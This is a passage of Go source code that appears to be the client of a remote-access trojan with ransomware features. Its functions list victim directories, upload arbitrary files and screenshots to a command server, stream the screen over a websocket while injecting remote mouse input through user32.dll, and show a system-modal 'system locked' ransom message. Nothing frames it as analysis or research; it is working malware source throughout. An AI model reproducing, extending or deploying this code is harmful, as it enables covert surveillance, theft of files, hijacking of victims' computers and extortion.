		return fmt.Sprintf("Error reading directory %s: %v", path, err)
	}

	var files []FileInfo
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		files = append(files, FileInfo{
			Name:    entry.Name(),
			Path:    filepath.Join(path, entry.Name()),
			Size:    info.Size(),
			IsDir:   entry.IsDir(),
			ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
		})
	}

	jsonData, err := json.Marshal(files)
	if err != nil {
		return fmt.Sprintf("Error encoding file list: %v", err)
	}
	return string(jsonData)
}

func uploadFile(path string) string {
	file, err := os.Open(path)
	if err != nil {
		return fmt.Sprintf("Error opening file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return fmt.Sprintf("Error creating form file: %v", err)
	}
	if _, err := io.Copy(part, file); err != nil {
		return fmt.Sprintf("Error copying file content: %v", err)
	}

	// Add device_id field
	writer.WriteField("device_id", currentDeviceID)

	if err := writer.Close(); err != nil {
		return fmt.Sprintf("Error closing writer: %v", err)
	}

	req, err := http.NewRequest("POST", ServerURL+"/api/upload", body)
	if err != nil {
		return fmt.Sprintf("Error creating request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Reuse existing httpClient
	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Sprintf("Error uploading file: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Sprintf("Server returned status: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	// Return the URL where the file can be accessed
	// URL would be {ServerURL}/uploads/{device_id}/{filename}
	url := fmt.Sprintf("%s/uploads/%s/%s", ServerURL, currentDeviceID, filepath.Base(path))
	return fmt.Sprintf("Upload successful: %s", url)
}

func takeScreenshot() string {
	if runtime.GOOS != "windows" {
		return "Screenshot only supported on Windows"
	}

	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("screen_%d.png", time.Now().Unix()))

	// Use kbinani/screenshot for cleaner capture
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "No active displays found"
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Sprintf("Capture failed: %v", err)
	}

	file, err := os.Create(tempFile)
	if err != nil {
		return fmt.Sprintf("File creation failed: %v", err)
	}
	defer file.Close()

	if err := png.Encode(file, img); err != nil {
		return fmt.Sprintf("PNG encode failed: %v", err)
	}
	file.Close()

	// Upload
	result := uploadFile(tempFile)

	// Cleanup
	os.Remove(tempFile)

	return result
}

func startRemoteControl() {
	// Connect to WS
	// Derive WS URL from ServerURL dynamically to match current config
	wsURL := strings.Replace(ServerURL, "http", "ws", 1) + "/api/ws/client?id=" + currentDeviceID

	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		log.Println("WS Dial error:", err)
		return
	}
	defer c.Close()

	log.Println("Connected to Remote Control WS")

	// Input Listener
	go func() {
		for {
			_, message, err := c.ReadMessage()
			if err != nil {
				log.Println("WS Read error:", err)
				return
			}
			handleInputMessage(message)
		}
	}()

	// Screen Stream Loop
	for {
		n := screenshot.NumActiveDisplays()
		if n > 0 {
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err == nil {
				// Resize or compress?
				// Sending full resolution PNG is too slow. Use JPEG.
				var buf bytes.Buffer
				// Quality 50 is good balance
				if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 50}); err == nil {
					err = c.WriteMessage(websocket.BinaryMessage, buf.Bytes())
					if err != nil {
						log.Println("WS Write error:", err)
						return
					}
				}
			}
		}
		time.Sleep(100 * time.Millisecond) // 10 FPS
	}
}

type InputEvent struct {
	Type   string  `json:"type"` // "mousemove", "mousedown", "mouseup", "keydown"
	X      float64 `json:"x"`    // Normalized 0-1
	Y      float64 `json:"y"`    // Normalized 0-1
	Button int     `json:"button"`
	Key    int     `json:"key"`
}

func handleInputMessage(data []byte) {
	var event InputEvent
	if err := json.Unmarshal(data, &event); err != nil {
		return
	}

	// Get Screen Size
	bounds := screenshot.GetDisplayBounds(0)
	width := bounds.Dx()
	height := bounds.Dy()

	absX := int32(event.X * float64(width))
	absY := int32(event.Y * float64(height))

	user32 := syscall.NewLazyDLL("user32.dll")
	setCursorPos := user32.NewProc("SetCursorPos")
	mouseEvent := user32.NewProc("mouse_event")

	// Consts
	const (
		MOUSEEVENTF_LEFTDOWN   = 0x0002
		MOUSEEVENTF_LEFTUP     = 0x0004
		MOUSEEVENTF_RIGHTDOWN  = 0x0008
		MOUSEEVENTF_RIGHTUP    = 0x0010
		MOUSEEVENTF_MIDDLEDOWN = 0x0020
		MOUSEEVENTF_MIDDLEUP   = 0x0040
	)

	switch event.Type {
	case "mousemove":
		setCursorPos.Call(uintptr(absX), uintptr(absY))
	case "mousedown":
		setCursorPos.Call(uintptr(absX), uintptr(absY)) // Ensure position
		var flags uintptr
		if event.Button == 0 {
			flags = MOUSEEVENTF_LEFTDOWN
		}
		if event.Button == 2 {
			flags = MOUSEEVENTF_RIGHTDOWN
		}
		mouseEvent.Call(flags, 0, 0, 0, 0)
	case "mouseup":
		setCursorPos.Call(uintptr(absX), uintptr(absY))
		var flags uintptr
		if event.Button == 0 {
			flags = MOUSEEVENTF_LEFTUP
		}
		if event.Button == 2 {
			flags = MOUSEEVENTF_RIGHTUP
		}
		mouseEvent.Call(flags, 0, 0, 0, 0)
	case "click":
		// Simple click
		setCursorPos.Call(uintptr(absX), uintptr(absY))
		mouseEvent.Call(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
		mouseEvent.Call(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
	}
}

func showRansomNote() {
	if runtime.GOOS != "windows" {
		return
	}

	user32 := syscall.NewLazyDLL("user32.dll")
	procMessageBox := user32.NewProc("MessageBoxW")

	title, _ := syscall.UTF16PtrFromString("系统已锁定")
	message, _ := syscall.UTF16PtrFromString(RansomNote)

	// 0x00000030 = MB_ICONEXCLAMATION
	// 0x00001000 = MB_SYSTEMMODAL (Topmost)
	procMessageBox.Call(
		0,
		uintptr(unsafe.Pointer(message)),
		uintptr(unsafe.Pointer(title)),
		0x00000030|0x00001000,
	)
}
